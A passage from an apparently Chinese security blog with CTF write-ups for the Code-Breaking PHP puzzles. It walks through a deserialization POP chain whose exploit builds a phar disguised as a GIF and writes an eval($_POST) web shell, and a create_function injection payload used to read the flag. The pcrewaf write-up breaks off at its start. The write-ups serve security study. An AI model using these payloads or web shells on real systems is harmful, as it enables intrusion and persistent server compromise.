class="hljs-variable">$evalobj</span>);<br><span class="hljs-variable">$g1</span>-&gt;formatters = <span class="hljs-keyword">array</span>(<br>    <span class="hljs-string">&quot;dispatch&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<br>        <span class="hljs-variable">$g2</span>, <br>        <span class="hljs-string">&quot;getFormatter&quot;</span>,<br>    )<br>);<br></code></pre></td></tr></table></figure><p>当在<code>$g1</code>中调用<code>dispatch(&#39;可控值&#39;)</code>时，由于类中不存在该方法，则调用<code>__call()</code>。</p><p>假设执行的代码为<code>$g1-&gt;dispatch(&#39;mengchen&#39;);</code>。</p><p>则传给<code>__call($method, $attributes)</code>，传入的参数<code>$method=&#39;dispatch&#39;</code>、<code>$attributes = [&#39;mengchen&#39;]</code>。</p><p>然后进入<code>format($formatter, $arguments = array())</code>，此时，传入的参数<code>$formatter=&#39;dispatch&#39;</code>、<code>$arguments=[&#39;mengchen&#39;]</code>。</p><p>接下来，在函数<code>call_user_func_array()</code>中，<code>$this-&gt;getFormatter($formatter)</code>，就是<code>$g1-&gt;getFormatter(&#39;dispatch&#39;) === [$g2, &quot;getFormatter&quot;]</code>。</p><p>也就是执行函数<code>call_user_func_array([​$g2, &quot;getFormatter&quot;], [&#39;mengchen&#39;])</code>。</p><p>也就调用了<code>$g2-&gt;getFormatter(&#39;mengchen&#39;) === $evalobj</code>。</p><p>这样就实现了返回任意一个类。</p><p>此时<code>$res == $evalobj</code>。</p><p>到此<code>while (!call_user_func($this-&gt;validator, $res));</code>中的<code>$res</code>我们完全可控了，接下来看<code>$this-&gt;validator</code>。</p><p>在这里找了一个类来做跳板。</p><p><code>vendor/phpunit/phpunit/src/Framework/MockObject/Stub/ReturnCallback.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ReturnCallback</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Stub</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$callback</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$callback</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">$this</span>-&gt;callback = <span class="hljs-variable">$callback</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invoke</span>(<span class="hljs-params">Invocation <span class="hljs-variable">$invocation</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> \call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;callback, <span class="hljs-variable">$invocation</span>-&gt;getParameters());<br>    &#125;<br>    <span class="hljs-comment">//省略部分代码......</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在函数<code>invoke()</code>中，<code>call_user_func_array()</code>的两个参数都是反序列化可控的。<code>Invocation</code>是一个接口，找一下<code>getParameters()</code>的实现。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StaticInvocation</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">Invocation</span>, <span class="hljs-title">SelfDescribing</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$parameters</span>;<br><br>    <span class="hljs-comment">//省略部分代码......</span><br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getParameters</span>(<span class="hljs-params"></span>): <span class="hljs-title">array</span></span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;parameters;<br>    &#125;<br>    <span class="hljs-comment">//省略部分代码......</span><br>&#125;<br></code></pre></td></tr></table></figure><p><code>call_user_func_array(</code>)的两个参数我们都能控制了，然后在<code>ValidGenerator</code>类的<code>while (!call_user_func($this-&gt;validator, $res));</code>中完成调用即可。</p><p>到此完成整个POP链。</p><h3 id="1-3-攻击思路"><a href="#1-3-攻击思路" class="headerlink" title="1.3 攻击思路"></a>1.3 攻击思路</h3><p>令<code>$this-&gt;validator</code> == <code>[$ReturnCallbackobj, &#39;invoke&#39;]</code>，这样<code>$this-&gt;validator</code>就成了<code>invoke()</code>方法，然后<code>call_user_func()</code>调用<code>invoke()</code>方法，<code>invoke()</code>调用<code>call_user_func_array()</code>，因为<code>call_user_func_array()</code>的两参数可控，这样就能<code>getshell</code>了。</p><h2 id="2-Exp"><a href="#2-Exp" class="headerlink" title="2. Exp"></a>2. Exp</h2><p>由上面的分析过程，可以构造最终Exp。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">namespace</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>&#123;<br><span class="hljs-title">class</span> <span class="hljs-title">PendingBroadcast</span>&#123;<br><span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()&#123;<br>$<span class="hljs-title">this</span>-&gt;<span class="hljs-title">events</span> = <span class="hljs-title">new</span> \<span class="hljs-title">Faker</span>\<span class="hljs-title">ValidGenerator</span>();<br><span class="hljs-keyword">$this</span>-&gt;event = <span class="hljs-string">&#x27;mengchen&#x27;</span>;<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span>&#123;<br><span class="hljs-title">class</span> <span class="hljs-title">ValidGenerator</span>&#123;<br><span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()&#123;<br>$<span class="hljs-title">si</span> = <span class="hljs-title">new</span> \<span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">Invocation</span>\<span class="hljs-title">StaticInvocation</span>();<br><span class="hljs-variable">$g1</span> = <span class="hljs-keyword">new</span> \Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;mengchen&#x27;</span> =&gt; <span class="hljs-variable">$si</span> ));<br><span class="hljs-variable">$g2</span> = <span class="hljs-keyword">new</span> \Faker\<span class="hljs-built_in">Generator</span>(<span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;dispatch&quot;</span> =&gt; <span class="hljs-keyword">array</span>(<span class="hljs-variable">$g1</span>, <span class="hljs-string">&quot;getFormatter&quot;</span>)));<br><br><span class="hljs-variable">$rc</span> = <span class="hljs-keyword">new</span> \PHPUnit\Framework\MockObject\Stub\ReturnCallback();<br><br><span class="hljs-keyword">$this</span>-&gt;validator = <span class="hljs-keyword">array</span>(<span class="hljs-variable">$rc</span>, <span class="hljs-string">&quot;invoke&quot;</span>);<br><span class="hljs-keyword">$this</span>-&gt;generator = <span class="hljs-variable">$g2</span>;<br><span class="hljs-keyword">$this</span>-&gt;maxRetries = <span class="hljs-number">23333</span>;<br>&#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span>&#123;<br>        <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$form</span></span>)</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters = <span class="hljs-variable">$form</span>;<br>        &#125;<br>&#125;<br><br>&#125;<br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">Invocation</span>&#123;<br><span class="hljs-title">class</span> <span class="hljs-title">StaticInvocation</span>&#123;<br><span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()&#123;<br>$this-&gt;parameters = array(&#x27;/var/www/html/upload/shell.php&#x27;,&#x27;&lt;?php phpinfo();eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;);<br>&#125;<br>&#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">PHPUnit</span>\<span class="hljs-title">Framework</span>\<span class="hljs-title">MockObject</span>\<span class="hljs-title">Stub</span>&#123;<br><span class="hljs-title">class</span> <span class="hljs-title">ReturnCallback</span>&#123;<br><span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()&#123;<br>$this-&gt;callback = &#x27;file_put_contents&#x27;;<br>&#125;<br>&#125;<br>&#125;<br><br><br><span class="hljs-keyword">namespace</span>&#123;<br>$<span class="hljs-title">exp</span> = <span class="hljs-title">new</span> <span class="hljs-title">Illuminate</span>\<span class="hljs-title">Broadcasting</span>\<span class="hljs-title">PendingBroadcast</span>();<br>print_r(urlencode(serialize(<span class="hljs-variable">$exp</span>)));<br><br><span class="hljs-comment">// phar</span><br><span class="hljs-variable">$p</span> = <span class="hljs-keyword">new</span> Phar(<span class="hljs-string">&#x27;./meng.phar&#x27;</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-variable">$p</span>-&gt;startBuffering();<br>    <span class="hljs-variable">$p</span>-&gt;setStub(<span class="hljs-string">&#x27;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&#x27;</span>);<span class="hljs-comment">//设置stub，增加gif文件头</span><br>    <span class="hljs-variable">$p</span>-&gt;setMetadata(<span class="hljs-variable">$exp</span>); <span class="hljs-comment">//将自定义meta-data存入manifest</span><br>    <span class="hljs-variable">$p</span>-&gt;addFromString(<span class="hljs-string">&#x27;test.txt&#x27;</span>,<span class="hljs-string">&#x27;test&#x27;</span>);<span class="hljs-comment">//添加要压缩的文件</span><br>    <span class="hljs-variable">$p</span>-&gt;stopBuffering();<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="3-利用过程"><a href="#3-利用过程" class="headerlink" title="3. 利用过程"></a>3. 利用过程</h2><p>在本地跑一下<code>exp</code>，然后将生成的<code>phar</code>文件改一个后缀名，直接上传即可，在返回的<code>json</code>数据中有上传图片的路径。</p><p><img src="https://image.mengsec.com/code-breaking-lumenserial/3.png" alt="3"></p><p>然后直接访问</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">139.199.31.158:8080</span>/server/editor?action=Catchimage&amp;source[]=phar:///var/www/html/upload/image/<span class="hljs-number">415</span>c<span class="hljs-number">92</span>e<span class="hljs-number">8</span>be<span class="hljs-number">7</span>c<span class="hljs-number">68409</span>ca<span class="hljs-number">6</span>bd<span class="hljs-number">369</span>d<span class="hljs-number">87482</span>f/<span class="hljs-number">201902</span>/<span class="hljs-number">26</span>/e<span class="hljs-number">1</span>ae<span class="hljs-number">6</span>f<span class="hljs-number">3</span>f<span class="hljs-number">0833</span>e<span class="hljs-number">9</span>fd<span class="hljs-number">73</span>f<span class="hljs-number">6</span>.gif<br></code></pre></td></tr></table></figure><p>触发反序列化，在服务器上写马。</p><p><img src="https://image.mengsec.com/code-breaking-lumenserial/4.png" alt="4"></p><p>然后getflag</p><p><img src="https://image.mengsec.com/code-breaking-lumenserial/5.png" alt="5"></p><h2 id="4-References"><a href="#4-References" class="headerlink" title="4. References"></a>4. References</h2><p><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></p><p><a href="http://www.kingkk.com/2018/11/Code-Breaking-Puzzles-%E9%A2%98%E8%A7%A3-%E5%AD%A6%E4%B9%A0%E7%AF%87/">http://www.kingkk.com/2018/11/Code-Breaking-Puzzles-题解-学习篇/</a></p><p><a href="http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/">http://hpdoger.me/2019/01/09/Code-breaking-medium%E4%B9%8Blumenserial/</a></p><p><a href="https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html">https://www.cnblogs.com/iamstudy/articles/code_breaking_lumenserial_writeup.html</a></p>]]></content>
    
    
    
    <tags>
      
      <tag>Writeup</tag>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>代码审计 Code-Breaking 做题记录</title>
    <link href="/2019/02/24/code-breaking/"/>
    <url>/2019/02/24/code-breaking/</url>
    
    <content type="html"><![CDATA[<p>好久没更新博客了，整理下之前的做题笔记</p><a id="more"></a><h2 id="1-easy-function"><a href="#1-easy-function" class="headerlink" title="1. easy - function"></a>1. easy - function</h2><p>代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$action</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;action&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$arg</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;arg&#x27;</span>] ?? <span class="hljs-string">&#x27;&#x27;</span>;<br><br><span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>, <span class="hljs-variable">$action</span>)) &#123;<br>    show_source(<span class="hljs-keyword">__FILE__</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$action</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$arg</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在这里考察的是<code>create_function</code>代码注入 </p><p><code>PHP 7.2.13</code> 源码<br>路径 <code>php-7.2.13/Zend/zend_builtin_functions.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> LAMBDA_TEMP_FUNCNAME<span class="hljs-meta-string">&quot;__lambda_func&quot;</span></span><br><span class="hljs-comment">/* &#123;&#123;&#123; proto string create_function(string args, string code)</span><br><span class="hljs-comment">   Creates an anonymous function, and returns its name (funny, eh?) */</span><br>ZEND_FUNCTION(create_function)<br>&#123;<br>    zend_string *function_name;<br><span class="hljs-keyword">char</span> *eval_code, *function_args, *function_code;<br><span class="hljs-keyword">size_t</span> eval_code_length, function_args_len, function_code_len;<br><span class="hljs-keyword">int</span> retval;<br><span class="hljs-keyword">char</span> *eval_name;<br><br><span class="hljs-keyword">if</span> (zend_parse_parameters(ZEND_NUM_ARGS(), <span class="hljs-string">&quot;ss&quot;</span>, &amp;function_args, &amp;function_args_len, &amp;function_code, &amp;function_code_len) == FAILURE) &#123;<br><span class="hljs-keyword">return</span>;<br>&#125;<br><br>eval_code = (<span class="hljs-keyword">char</span> *) emalloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;function &quot;</span> LAMBDA_TEMP_FUNCNAME)<br>+function_args_len<br>+<span class="hljs-number">2</span><span class="hljs-comment">/* for the args parentheses */</span><br>+<span class="hljs-number">2</span><span class="hljs-comment">/* for the curly braces */</span><br>+function_code_len);<br><br>eval_code_length = <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;function &quot;</span> LAMBDA_TEMP_FUNCNAME <span class="hljs-string">&quot;(&quot;</span>) - <span class="hljs-number">1</span>;<br><span class="hljs-built_in">memcpy</span>(eval_code, <span class="hljs-string">&quot;function &quot;</span> LAMBDA_TEMP_FUNCNAME <span class="hljs-string">&quot;(&quot;</span>, eval_code_length);<br><br><span class="hljs-built_in">memcpy</span>(eval_code + eval_code_length, function_args, function_args_len);<br>eval_code_length += function_args_len;<br><br>eval_code[eval_code_length++] = <span class="hljs-string">&#x27;)&#x27;</span>;<br>eval_code[eval_code_length++] = <span class="hljs-string">&#x27;&#123;&#x27;</span>;<br><br><span class="hljs-built_in">memcpy</span>(eval_code + eval_code_length, function_code, function_code_len);<br>eval_code_length += function_code_len;<br><br>eval_code[eval_code_length++] = <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>eval_code[eval_code_length] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br>eval_name = zend_make_compiled_string_description(<span class="hljs-string">&quot;runtime-created function&quot;</span>);<br>retval = zend_eval_stringl(eval_code, eval_code_length, <span class="hljs-literal">NULL</span>, eval_name);<br>efree(eval_code);<br>efree(eval_name);<br><br><span class="hljs-keyword">if</span> (retval==SUCCESS) &#123;<br>zend_op_array *func;<br>HashTable *static_variables;<br><br>func = zend_hash_str_find_ptr(EG(function_table), LAMBDA_TEMP_FUNCNAME, <span class="hljs-keyword">sizeof</span>(LAMBDA_TEMP_FUNCNAME)<span class="hljs-number">-1</span>);<br><span class="hljs-keyword">if</span> (!func) &#123;<br>zend_error_noreturn(E_CORE_ERROR, <span class="hljs-string">&quot;Unexpected inconsistency in create_function()&quot;</span>);<br>RETURN_FALSE;<br>&#125;<br><span class="hljs-keyword">if</span> (func-&gt;refcount) &#123;<br>(*func-&gt;refcount)++;<br>&#125;<br>static_variables = func-&gt;static_variables;<br>func-&gt;static_variables = <span class="hljs-literal">NULL</span>;<br>zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, <span class="hljs-keyword">sizeof</span>(LAMBDA_TEMP_FUNCNAME)<span class="hljs-number">-1</span>);<br>func-&gt;static_variables = static_variables;<br><br>function_name = zend_string_alloc(<span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;0lambda_&quot;</span>)+MAX_LENGTH_OF_LONG, <span class="hljs-number">0</span>);<br>ZSTR_VAL(function_name)[<span class="hljs-number">0</span>] = <span class="hljs-string">&#x27;\0&#x27;</span>;<br><br><span class="hljs-keyword">do</span> &#123;<br>ZSTR_LEN(function_name) = <span class="hljs-built_in">snprintf</span>(ZSTR_VAL(function_name) + <span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-string">&quot;lambda_&quot;</span>)+MAX_LENGTH_OF_LONG, <span class="hljs-string">&quot;lambda_%d&quot;</span>, ++EG(lambda_count)) + <span class="hljs-number">1</span>;<br>&#125; <span class="hljs-keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="hljs-literal">NULL</span>);<br>RETURN_NEW_STR(function_name);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>zend_hash_str_del(EG(function_table), LAMBDA_TEMP_FUNCNAME, <span class="hljs-keyword">sizeof</span>(LAMBDA_TEMP_FUNCNAME)<span class="hljs-number">-1</span>);<br>RETURN_FALSE;<br>&#125;<br>&#125;<br><span class="hljs-comment">/* &#125;&#125;&#125; */</span><br></code></pre></td></tr></table></figure><p>从注释可知，用户传入的两个参数为<code>function_args</code>和<code>function_code</code></p><p>跟进代码，可知后面会被拼接成一个完整的<code>php</code>函数,一段以<code>\0</code>结尾的字符串<code>eval_code: function __lambda_func (function_args)&#123;function_code&#125; \0</code><br>然后<code>eval_code</code>被传入<code>zend_eval_stringl()</code>执行。</p><p>在本题中，<code>function_code</code>，也就是<code>$_GET[&#39;arg&#39;]</code>是可控的,我们可以构造<br><code>arg=return 0;&#125;phpinfo();//</code></p><p>但是还有一个正则需要绕过,<code>$_GET[&#39;action&#39;]</code>的开头不能是<code>a-z</code>、<code>0-9</code>还有<code>_</code><br>因此直接传<code>create_function</code>是不行的。<br>这就涉及到了PHP的另一个知识点 <code>namespace</code><br>在PHP中，<code>\函数名a</code>,即调用全局的函数<code>a</code>。<br>因此我们可以传入<code>action=\create_function</code>来调用全局函数<code>create_function</code>。</p><p>payload:</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">action</span>=\create_function&amp;arg=return <span class="hljs-number">0</span><span class="hljs-comment">;&#125;phpinfo();//</span><br></code></pre></td></tr></table></figure><p>成功执行代码<code>phpinfo()</code></p><p><img src="https://image.mengsec.com/code-breaking/1.png" alt="1"></p><p>可知禁止执行以下函数</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mel"><span class="hljs-keyword">system</span>,shell_exec,passthru,<span class="hljs-keyword">exec</span>,<span class="hljs-keyword">popen</span>,proc_open,pcntl_exec,mail,<span class="hljs-keyword">putenv</span>,apache_setenv,mb_send_mail,dl,set_time_limit,ignore_user_abort,symlink,link,error_log<br></code></pre></td></tr></table></figure><p>列出当前目录文件。</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir">http:<span class="hljs-comment">//51.158.75.42:8087/index.php?action=\create_function&amp;arg=return 0;&#125;var_dump(scandir(&#x27;./&#x27;));//</span><br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">3</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">9</span>) <span class="hljs-string">&quot;index.php&quot;</span> &#125; <br></code></pre></td></tr></table></figure><p>列出上级目录文件。</p><figure class="highlight zephir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs zephir">http:<span class="hljs-comment">//51.158.75.42:8087/index.php?action=\create_function&amp;arg=return 0;&#125;var_dump(scandir(&#x27;../&#x27;));//</span><br><br><span class="hljs-keyword">array</span>(<span class="hljs-number">4</span>) &#123; [<span class="hljs-number">0</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">1</span>) <span class="hljs-string">&quot;.&quot;</span> [<span class="hljs-number">1</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;..&quot;</span> [<span class="hljs-number">2</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">31</span>) <span class="hljs-string">&quot;flag_h0w2execute_arb1trary_c0de&quot;</span> [<span class="hljs-number">3</span>]=&gt; <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;html&quot;</span> &#125; <br></code></pre></td></tr></table></figure><p>读取flag。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">http</span>://<span class="hljs-number">51.158.75.42:8087</span>/index.php?action=\create_function&amp;arg=return <span class="hljs-number">0</span>;&#125;var_dump(scandir(&#x27;../&#x27;));readfile(&#x27;../flag_h<span class="hljs-number">0</span>w<span class="hljs-number">2</span>execute_arb<span class="hljs-number">1</span>trary_c<span class="hljs-number">0</span>de&#x27;);//<br></code></pre></td></tr></table></figure><p><img src="https://image.mengsec.com/code-breaking/2.png" alt="2"></p><h2 id="2-easy-pcrewaf"><a href="#2-easy-pcrewaf" class="headerlink" title="2. easy - pcrewaf"></a>2. easy - pcrewaf</h2><p>直接给了源代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">is_php</span>(<span class="hljs-params"><span class="hljs-variable">$data</span></span>)</span>&#123;<br>    <span class="hljs-keyword">return</span> preg_match(<span class="hljs-string">&#x27;/&lt;\?.*[(`;?&gt;].*/is&#x27;</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_FILES</span>)) &#123;<br>    <span class="hljs-keyword">die</span>(show_source(<span class="hljs-keyword">__FILE__</span>));<br>&#125;<br><br><span class="hljs-variable">$user_dir</span> = <span class="hljs-string">&#x27;data/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]);<br><span class="hljs-variable">$data</span> = file_get_contents(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>]);<br><span class="hljs-keyword">if</span> (is_php(<span class="hljs-variable">$data</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;bad request&quot;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    @mkdir(<span class="hljs-variable">$user_dir</span>, <span class="hljs-number">0755</span>);<br>    <span class="hljs-variable">$path</span> = <span class="hljs-variable">$user_dir</span> . <span class="hljs-string">&#x27;/&#x27;</span> . random_int(<span class="hljs-number">0</span>, <span class="hljs-number">10</span>) . <span class="hljs-string">&#x27;.php&#x27;</span>;<br>    move_uploaded_file(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>], <span class="hljs-variable">$path</span>);<br><br>    header(<span class="hljs-string">&quot;Location: <span class="hljs-subst">$path</span>&quot;</span>, <span class="hljs-literal">true</span>, <span class="hljs-number">303</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>可知通过程序通过正则过滤了php代码。</p><p>参考链接<br><a href="https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html">https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html</a></p><p>解题脚本</p><figure class="highlight python"><table><tr><td 